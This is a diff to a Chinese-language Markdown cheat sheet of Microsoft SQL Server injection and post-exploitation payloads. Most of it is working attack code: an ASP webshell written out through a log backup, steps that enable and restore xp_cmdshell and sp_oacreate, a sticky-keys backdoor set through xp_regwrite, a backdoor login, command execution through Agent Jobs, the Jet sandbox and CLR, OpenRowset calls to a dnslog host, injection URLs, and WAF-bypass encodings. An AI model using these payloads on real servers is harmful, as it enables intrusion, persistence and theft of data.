@@ -1,7 +1,4 @@
 # Basic
-
----
-
 ## 基础查询
 ### 数据库确定
 `select 1/iif((select count(*) from sysobjects )>0,1,0)`
@@ -57,20 +54,17 @@ insert into cmd(a) values('<%execute(request("go"))%>')
 backup log web to disk = 'c:\www\shell.asp'
 ```
 # 进阶利用
-
 ---
-
 ## xp_dirtree
 xp_dirtree有三个参数，
 要列的目录
 是否要列出子目录下的所有文件和文件夹，默认为0，如果不需要设置为1
 是否需要列出文件，默认为不列，如果需要列文件设置为1
-
-
 ```sql
 xp_dirtree 'c:\', 1, 1      #列出当前目录下所有的文件和文件夹
 ```
 ## sp_oacreate
+sp_oacreate系统存储过程可以用于对文件删除、复制、移动等操作，还可以配合sp_oamethod系统存储过程调用系统wscript.shell来执行系统命令。sp_oacreate和sp_oamethod两个过程分别用来创建和执行脚本语言。
 ```sql
 #判断sp_oacreate状态
 select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'
@@ -89,19 +83,22 @@ BULK INSERT cmd_output FROM 'c:\temp\user.txt' WITH (FIELDTERMINATOR='n',ROWTERM
 select * from cmd_output
 ```
 ## 开启xp_cmdshell
-```
+```sql
 exec sp_configure 'show advanced options',1  
 reconfigure;exec sp_configure 'xp_cmdshell',1;
 reconfigure
 ```
+被删除后，重新添加xp``_cmdshell存储过程语句
+```sql
+EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'declare @o int;
+sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll';
+```
 ## ap_addlogin添加用户
-
-
 ```sql
 EXEC sp_addlogin 'Admin', 'test123', 'master'
 # 用户Admin，密码test123，默认数据库master
 ```
-## 劫持粘滞键
+## xp_regwrite劫持粘滞键
 ```sql
 #sp_oacreate复制文件
 exec sp_configure 'show advanced options', 1;RECONFIGURE
@@ -112,9 +109,7 @@ exec sp_oamethod @o, 'copyfile',null,'c:\windows\system32\cmd.exe' ,'c:\windows\
 exec xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution Options\sethc.EXE','Debugger','REG_SZ','c:\windows\system32\cmd.exe';
 ```
 # CLR执行命令
-
 ---
-
 ## 创建sql文件
 勾选创建sql文件,选3.5Net 兼容性更好
 ![CLR1.png](https://cdn.nlark.com/yuque/0/2021/png/12610959/1628249622336-34f54dea-5aae-4584-a80c-eeff2f1d3f01.png#clientId=ua0a461ef-7c4c-4&from=drop&id=u8a58121a&margin=%5Bobject%20Object%5D&name=CLR1.png&originHeight=561&originWidth=1027&originalType=binary&ratio=1&size=19411&status=done&style=none&taskId=u1c032984-9062-480c-a90b-156643f0370)
@@ -234,14 +229,8 @@ nt service\mssql$sqlexpress
 nt service\mssql$sqlexpress
 ```
 # Agent Job代理作业
-
----
-
 1. 目标服务器必须开启了MSSQL Server代理服务；
 1. 服务器中当前运行的用户账号必须拥有足够的权限去创建并执行代理作业；
-
-
-
 ```sql
 USE msdb; 
 EXEC dbo.sp_add_job @job_name = N'test_powershell_job1' ;
@@ -250,11 +239,7 @@ EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1';
 EXEC dbo.sp_start_job N'test_powershell_job1';
 ```
 # 沙盒执行命令
-
----
-
-
-
+沙盒提权的原理就是jet.oledb（修改注册表）执行系统命令。数据库通过查询方式调用mdb文件，执行参数，绕过系统本身自己的执行命令，实现mdb文件执行命令
 ```sql
 exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
 
@@ -279,8 +264,6 @@ Payloads Test On MSSQL 2019、2017、2016SP2。
 **权限**：需要CONTROL SERVER权限
 ## 替换报错表达式
 以下函数会触发类型错误
-
-
 - SUSER_NAME()
 - USER_NAME()
 - PERMISSIONS()
@@ -288,21 +271,12 @@ Payloads Test On MSSQL 2019、2017、2016SP2。
 - FILE_NAME()
 - TYPE_NAME()
 - COL_NAME()
-
-
-
 ORI:`https://vuln.app/getItem?id=1'+AND+1=@@version--`
-
-
 New:`https://vuln.app/getItem?id=1'%2buser_name(@@version)--`
 ## 获取存储过程执行结果,查询配置是否开启
-
 1. 创建一个具有相同类型字段的表
 1. 执行存储过程将结果插入创建表中
 1. 从表中查询对应结果
-
-
-
 ```sql
 --查询配置
 drop table mdconfig;create table mdconfig(a varchar(max),b int,c int,d int,e int)
@@ -315,7 +289,6 @@ insert md32 exec xp_cmdshell 'whoami'
 select a from md32
 ```
 ## 格式化数据
-
 - for xml  需要指定模式(手动添加根节点)
 - for json
 ### for json
@@ -326,7 +299,6 @@ select a from md32
 **报错注入:**(基于错误的向量需要别名或名称，因为不能将两者的表达式输出格式化为JSON。)
 `https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--`
 ## 读取本地文件
-
 - OpenRowset()
 ### OpenRowset()
 ```sql
@@ -336,14 +308,10 @@ reconfigure
 exec sp_configure 'Ad Hoc Distributed Queries',1
 reconfigure
 ```
-
-
 ```sql
 --OpenRowset()
 select * from OpenRowset('sqloledb','server=aaaa.dnslog.cn;uid=sa;pwd=sa','')
 ```
-
-
 **联合查询:**
 `https://vuln.app/getItem?id=-1+union+select+null,(select+x+from+OpenRowset(BULK+’C:\Windows\win.ini’,SINGLE_CLOB)+R(x)),null,null`
 **报错注入:**
@@ -362,9 +330,7 @@ EXEC sp_OADestory @a;
 `https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null`
 **权限**：如果用户在服务器上具有“查看服务器状态”权限，则该用户将在SQL Server实例上看到所有正在执行的会话；否则，用户将仅看到当前会话。
 # BypassWAF
-
 ---
-
 非标准的空白字符：%C2%85 или %C2%A0
 [https://vuln.app/getItem?id=1unionselect null,@@version,null--](https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--)
 科学（0e）和十六进制（0x）表示法，用于混淆UNION：
@@ -374,7 +340,6 @@ EXEC sp_OADestory @a;
 [https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--](https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--)
 SELECT和一次性列之间的\N分隔符：
 [https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--](https://vuln.app/getItem?id=0xunion+select%5CNnull,@@version,null+from+users--)
-
 ## ASP.NET 编码bypass
 ```
 POST /test/a.aspx?%C8%85%93%93%96%E6%96%99%93%84= HTTP/1.1 
@@ -386,7 +351,6 @@ Content-Length: 40
 
 %89%95%97%A4%A3%F1=%A7%A7%A7%A7%A7%A7%A7
 ```
-
 1.添加HTTP头 x-up-devcap-post-charset来表明使用的字符集，代替charset字段  
 2.添加UserAgent： UP xxx  
 3.参数键值都要编码  
